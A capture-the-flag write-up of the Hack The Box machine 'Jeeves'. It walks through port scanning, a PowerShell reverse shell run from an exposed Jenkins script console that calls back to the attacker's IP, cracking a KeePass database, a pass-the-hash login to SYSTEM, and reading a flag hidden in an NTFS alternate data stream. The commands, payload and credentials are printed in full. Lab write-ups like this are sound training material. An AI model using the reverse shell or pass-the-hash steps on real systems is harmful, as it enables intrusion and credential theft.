# HTB-Jeeves

<img width="862" height="793" alt="Screenshot 2025-09-20 214022" src="https://github.com/AmIACatPurr/HTB-CTF/blob/main/writeups/assets/jeeves.jpg" />


---
## Intro

"Jeeves is a bleak reminder that we build automation to escape human error, only to let a single unauthenticated pipeline hand over the keys to the entire kingdom."

Target IP 10.129.228.112
My IP 10.10.14.138

## nmap & enumeration
We started by mapping the target's digital footprint. The initial scan revealed standard windows infrastructure, but the real entry point was buried on a non-standard port.


```bash
┌─[eu-dedivip-1]─[10.10.14.138]─[justdave@htb-5iq3nsksik]─[~]
└──╼ [★]$ nmap -p- --min-rate 10000 10.129.228.112
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-14 00:34 EDT
Nmap scan report for 10.129.228.112
Host is up (0.0077s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2
```


```bash
┌─[eu-dedivip-1]─[10.10.14.138]─[justdave@htb-5iq3nsksik]─[~]
└──╼ [★]$ nmap -p 80,135,445,50000 -sCV 10.129.228.112
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-14 00:36 EDT
Nmap scan report for 10.129.228.112
Host is up (0.0078s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-06-14T09:36:53
|_  start_date: 2026-06-14T09:03:31
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 5h00m01s, deviation: 0s, median: 5h00m01s
```
Nothing much to see visiting the website

Nothing much here too from the scan
```bash
─[eu-dedivip-1]─[10.10.14.138]─[justdave@htb-5iq3nsksik]─[~]
└──╼ [★]$ feroxbuster -u http://10.129.228.112
                                                                                                                                  
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.228.112/
 🚩  In-Scope Url          │ 10.129.228.112
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        4w       50c http://10.129.228.112/error.html
200      GET      147l      319w     3744c http://10.129.228.112/style.css
200      GET       17l       40w      503c http://10.129.228.112/
400      GET        6l       26w      324c http://10.129.228.112/error%1F_log
[####################] - 5s     30004/30004   0s      found:4       errors:0      
[####################] - 5s     30000/30000   5892/s  http://10.129.228.112/
```

SMB ... nothing
```bash
┌─[eu-dedivip-1]─[10.10.14.138]─[justdave@htb-5iq3nsksik]─[~]
└──╼ [★]$ smbclient -N -L 10.129.228.112
session setup failed: NT_STATUS_ACCESS_DENIED
```

Port 50000 was screaming. A brute-force directory enumeration via feroxbuster ripped past the generic error pages and exposed a hidden Jenkins instance.

```bash
┌─[eu-dedivip-1]─[10.10.14.138]─[justdave@htb-5iq3nsksik]─[~]
└──╼ [★]$ feroxbuster -u http://10.129.228.112:50000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
                                                                                
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.228.112:50000/
 🚩  In-Scope Url          │ 10.129.228.112
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       11l       26w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves => http://10.129.228.112:50000/askjeeves/
```

playing around a bit and found the script console at http://10.129.228.112:50000/askjeeves/computer/(master)/script
opening on my terminal

```bash
─[eu-dedivip-1]─[10.10.14.138]─[justdave@htb-5iq3nsksik]─[~]
└──╼ [★]$ nc -lvnp 1111
Listening on 0.0.0.0 4444
```

Jenkins isn't just a CI/CD tool; to us, it’s an arbitrary code execution engine waiting for a operator. 
By hijacking the Script Console, we injected a native PowerShell payload to force an outbound connection back to our machine.
A listener caught the callback. We weren't just guests anymore; we were executing as Jeeves\kohsuke

```bash
String command = "\$client = New-Object System.Net.Sockets.TCPClient('10.10.14.138',1111);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()";
String[] cmd = ["powershell", "-c", command];
ProcessBuilder pb = new ProcessBuilder(cmd);
pb.start();


┌─[eu-dedivip-1]─[10.10.14.138]─[justdave@htb-5iq3nsksik]─[~]
└──╼ [★]$ nc -lvnp 1111
Listening on 0.0.0.0 1111
Connection received on 10.129.228.112 49678
whoami
jeeves\kohsuke
PS C:\Users\Administrator\.jenkins> 
```
i can move to the user Desktop to find the user flag

Local enumeration uncovered a locked KeePass database (CEH.kdbx) sitting in the user's documents.
Instead of messing with unstable GUI tools over a raw shell, we cloned the asset into the Jenkins workspace directory to bypass local network restrictions and pulled it down over HTTP.

```bash
PS C:\Users\kohsuke> dir Downloads
PS C:\Users\kohsuke> dir Documents


    Directory: C:\Users\kohsuke\Documents


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        9/18/2017   1:43 PM           2846 CEH.kdbx 

```


```bash
PS C:\Users\Administrator\.jenkins\workspace\Cat_Job> copy \users\kohsuke\Documents\CEH.kdbx .
PS C:\Users\Administrator\.jenkins\workspace\Cat_Job> dir


    Directory: C:\Users\Administrator\.jenkins\workspace\Cat_Job


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                                                                               
-a----        9/18/2017   1:43 PM           2846 CEH.kdbx                         
```

```bash
Workspace of Cat_Job on master
	CEH.kdbx	2.78 KB	view
```
Once the encrypted vault was isolated on local storage, we decoupled the cryptographic hash and turned a dictionary attack loose on it.

```bash
┌─[eu-dedivip-1]─[10.10.14.138]─[justdave@htb-5iq3nsksik]─[~/Downloads]
└──╼ [★]$ dir
CEH.kdbx
┌─[eu-dedivip-1]─[10.10.14.138]─[justdave@htb-5iq3nsksik]─[~/Downloads]
└──╼ [★]$ keepass2john CEH.kdbx > keepass.hash

┌─[root@htb-5iq3nsksik]─[/usr/share/wordlists]
└──╼ #gunzip -c /usr/share/wordlists/rockyou.txt.gz > /usr/share/wordlists/rockyou.txt
┌─[root@htb-5iq3nsksik]─[/home/justdave/Downloads]
└──╼ #john keepass.hash -w:/usr/share/wordlists/rockyou.txt
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:19 0.27% (ETA: 03:41:15) 0g/s 2456p/s 2456c/s 2456C/s 022307..012688
moonshine1       (CEH)     
1g 0:00:00:22 DONE (2026-06-14 01:44) 0.04498g/s 2473p/s 2473c/s 2473C/s nando1..moonshine1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
Got the password -> moonshine1
let's see the secrets within
For the fun i'll install keepassx -> sudo apt-get install keepassx
i'll save every password in a file and try them as Administrator, but got nothing
```bash
┌─[root@htb-5iq3nsksik]─[/home/justdave/Downloads]
└──╼ #crackmapexec smb 10.129.228.112 -u Administrator -p passwords 
SMB         10.129.228.112  445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.129.228.112  445    JEEVES           [-] Jeeves\Administrator:12345 STATUS_LOGON_FAILURE 
SMB         10.129.228.112  445    JEEVES           [-] Jeeves\Administrator:S1TjAtJHKsugh9oC4VZl STATUS_LOGON_FAILURE 
SMB         10.129.228.112  445    JEEVES           [-] Jeeves\Administrator:pwndyouall! STATUS_LOGON_FAILURE 
SMB         10.129.228.112  445    JEEVES           [-] Jeeves\Administrator:F7WhTrSFDKB6sxHU1cUn STATUS_LOGON_FAILURE 
SMB         10.129.228.112  445    JEEVES           [-] Jeeves\Administrator:lCEUnYPjNfIuPZSzOySA STATUS_LOGON_FAILURE 
SMB         10.129.228.112  445    JEEVES           [-] Jeeves\Administrator:Password STATUS_LOGON_FAILURE 

```
there was an entry that looked like a fun thing, not a password
aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00

cit from the master
Windows will show hashes in the format LM Hash:NT Hash. LM is the much less secure hash format used in legacy Windows systems. 
It’s typically not used, but kept around for backwards compatibility. Many times, the LM hash for the blank password is stored, which is ignored by Windows but 
allows the field not to be empty. aad3b435b51404eeaad3b435b51404ee is the LM hash of the empty password

we executed a Pass-the-Hash (PtH) maneuver to validate administrative control across SMB
Status: (Pwn3d!). The system accepted the token

```bash
┌─[root@htb-5iq3nsksik]─[/home/justdave/Downloads]
└──╼ #nxc smb 10.129.228.112 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
SMB         10.129.228.112  445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.129.228.112  445    JEEVES           [+] Jeeves\Administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)

─[root@htb-5iq3nsksik]─[/home/justdave/Downloads]
└──╼ #psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.129.228.112 cmd.exe
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.228.112.....
[*] Found writable share ADMIN$
[*] Uploading file egZMQjTB.exe
[*] Opening SVCManager on 10.129.228.112.....
[*] Creating service iXrd on 10.129.228.112.....
[*] Starting service iXrd.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
Reaching the Administrator's desktop presented a final, cynical joke left by the architect: hm.txt with a message reading "The flag is elsewhere. Look deeper."

In an NTFS environment, reality has layers. The text file was a front; the actual data payload was tucked inside a secondary data stream, completely invisible to standard directory queries.

OH boy
```bash

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk

C:\Users\Administrator\Desktop> more hm.txt
The flag is elsewhere.  Look deeper.

C:\Users\Administrator\Desktop> dir /r
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA

C:\Users\Administrator\Desktop> more < hm.txt:root.txt
afbc5bd4b615a60648cec41c6ac92530
```

More information regarding Alternate Data Streams can be found here: https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/

The stream yielded. The box belongs to the void.

Systems are built by humans trying to enforce order onto chaos. Our job is simply to remind them that order is an illusion, and the data always wants to be free.









